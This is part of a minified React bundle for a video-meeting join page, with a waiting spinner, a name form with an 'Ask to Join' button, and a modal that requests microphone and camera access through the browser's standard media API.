                                            "fill-rule": "nonzero",
                                            children: t.jsx("path", {
                                                d: "M10,3 C6.13401,3 3,6.13401 3,10 C3,10.2761 2.77614,10.5 2.5,10.5 C2.22386,10.5 2,10.2761 2,10 C2,5.58172 5.58172,2 10,2 C14.4183,2 18,5.58172 18,10 C18,14.4183 14.4183,18 10,18 C9.72386,18 9.5,17.7761 9.5,17.5 C9.5,17.2239 9.72386,17 10,17 C13.866,17 17,13.866 17,10 C17,6.13401 13.866,3 10,3 Z",
                                                id: "🎨-Color"
                                            })
                                        })
                                    })
                                })
                            })]
                        }), a.state !== "" && t.jsxs(t.Fragment, {
                            children: [a.state === "joining" && t.jsxs(t.Fragment, {
                                children: [t.jsx("h3", {
                                    className: "text-lg font-semibold text-center",
                                    children: "Asking to be let in"
                                }), t.jsx("p", {
                                    className: "text-xs py-2",
                                    children: "You'll join the call when someone lets you in"
                                }), t.jsx("div", {
                                    className: "",
                                    children: t.jsx("svg", {
                                        className: "animate-spin text-blue-500",
                                        width: "20px",
                                        height: "29px",
                                        viewBox: "0 0 20 20",
                                        children: t.jsx("g", {
                                            id: "🔍-System-Icons",
                                            stroke: "none",
                                            "stroke-width": "1",
                                            fill: "none",
                                            "fill-rule": "evenodd",
                                            children: t.jsx("g", {
                                                id: "ic_fluent_spinner_ios_20_regular",
                                                fill: "#3b82f6",
                                                "fill-rule": "nonzero",
                                                children: t.jsx("path", {
                                                    d: "M10,3 C6.13401,3 3,6.13401 3,10 C3,10.2761 2.77614,10.5 2.5,10.5 C2.22386,10.5 2,10.2761 2,10 C2,5.58172 5.58172,2 10,2 C14.4183,2 18,5.58172 18,10 C18,14.4183 14.4183,18 10,18 C9.72386,18 9.5,17.7761 9.5,17.5 C9.5,17.2239 9.72386,17 10,17 C13.866,17 17,13.866 17,10 C17,6.13401 13.866,3 10,3 Z",
                                                    id: "🎨-Color"
                                                })
                                            })
                                        })
                                    })
                                })]
                            }), a.state == "accept" && t.jsxs("form", {
                                onSubmit: r,
                                className: "w-full h-full flex flex-col justify-center items-start  space-y-4 pt-5 px-3 ",
                                children: [t.jsx("h3", {
                                    className: "text-xl text-center font-semibold block",
                                    children: "What is your name?"
                                }), t.jsx("input", {
                                    readOnly: a.state === "joining",
                                    value: a.name,
                                    onChange: n => s(i => ({
                                        ...i,
                                        name: n.target.value
                                    })),
                                    max: 60,
                                    type: "text",
                                    name: "name",
                                    placeholder: "Your name",
                                    required: !0,
                                    className: "w-full py-3 px-4 rounded-md border "
                                }), t.jsx("button", {
                                    disabled: a.loading || a.name.length < 1,
                                    className: "w-[80%] disabled:bg-gray-400 bg-blue-600 py-3 px-4 rounded-full mx-auto text-white",
                                    children: "Ask to Join"
                                })]
                            })]
                        })]
                    })]
                })
            }), a.showModal && H.createPortal(t.jsx("div", {
                className: "fixed w-full h-[100vh] z-20 top-0 left-0 bg-[#aaaaaa89] grid place-items-center",
                children: t.jsxs("section", {
                    className: "bg-white px-5 rounded-[20px] sm:w-[40%] w-[80%] min-h-96 py-4 mx-auto pb-8",
                    children: [a.state == "ready" && t.jsxs("div", {
                        className: "flex flex-col items-center space-y-3 pt-3 text-center",
                        children: [t.jsx("img", {
                            alt: "permission screen",
                            src: ne,
                            className: "h-44 w-48"
                        }), t.jsx("h3", {
                            className: "text-sm font-semibold text-center",
                            children: "Do you want people to see and hear you in the meeting?"
                        }), t.jsx("p", {
                            className: "text-xs",
                            children: "You can turn off your microphone and camera anytime you want."
                        }), t.jsx("button", {
                            onClick: () => {
                                var n;
                                if (s(i => ({
                                    ...i,
                                    state: "accept"
                                })),
                                !(navigator != null && navigator.mediaDevices))
                                    return s(i => ({
                                        ...i,
                                        withMedia: !1,
                                        showModal: !1,
                                        state: "accept"
                                    }));
                                (n = navigator == null ? void 0 : navigator.mediaDevices) == null || n.getUserMedia({
                                    video: !0,
                                    audio: !0
                                }).then(i => {
                                    e.current.srcObject = i,
                                    e.current.play(),
                                    s(o => ({
                                        ...o,
                                        stream: i,
                                        withMedia: !0,
                                        showModal: !1
                                    }))
                                }
                                ).catch(i => {
                                    s(o => ({
                                        ...o,
                                        withMedia: !1,
                                        showModal: !1,
                                        state: "accept"
                                    }))
                                }
                                )
                            }
                            ,
                            className: "text-xs bg-blue-600 text-white rounded-full py-2 px-3 hover:bg-blue-500",
                            children: "Allow microphone and camera"
                        }), t.jsx("button", {
                            className: "text-xs text-blue-500 font-semibold",
                            onClick: () => s(n => ({
                                ...n,
                                showModal: !1,
                                withMedia: !1,
                                state: "accept"
                            })),
                            children: "Continue without microphone and camera"
                        })]
                    }), a.state == "accept" && t.jsxs("div", {
                        className: "flex flex-col items-center space-y-3 pt-3 text-center",
                        children: [t.jsx("img", {
                            alt: "permissions_flow",
                            src: re,
                            className: "h-44 w-48"
                        }), t.jsxs("h3", {
                            className: "text-lg",
                            children: ["Click ", t.jsx("span", {
                                className: "font-bold",
                                children: "Allow"
                            })]
                        }), t.jsx("p", {
                            className: "text-xs",
                            children: "You can turn off your microphone anytime in the meeting"
                        })]
                    })]
                })
            }), document.querySelector("#modal"))]
        }), a.state == "meeting" && t.jsx(t.Fragment, {
            children: t.jsx(ye, {
                name: a.name
            })
        })]
    })
}
export {Me as default};
